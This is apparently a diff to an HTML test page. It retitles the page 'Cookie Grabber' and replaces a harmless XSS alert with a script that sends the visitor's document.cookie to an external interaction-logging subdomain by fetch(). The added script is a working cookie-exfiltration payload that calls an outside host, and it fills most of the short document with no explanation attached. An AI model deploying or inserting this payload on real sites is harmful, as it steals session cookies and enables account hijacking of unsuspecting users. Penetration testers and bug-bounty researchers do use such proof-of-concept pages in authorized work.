@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Test</title>
+    <title>Cookie Grabber</title>
 </head>
 <body>
     <script>
-        alert("XSS Triggered!"); // Replace with your desired XSS logic
+        // Replace the domain with your Interact.sh unique subdomain
+        fetch('http://ajvjpqvueywcbluubpcrxhhcixv6e13qy.oast.fun/?cookie=' + document.cookie);
     </script>
 </body>
 </html>
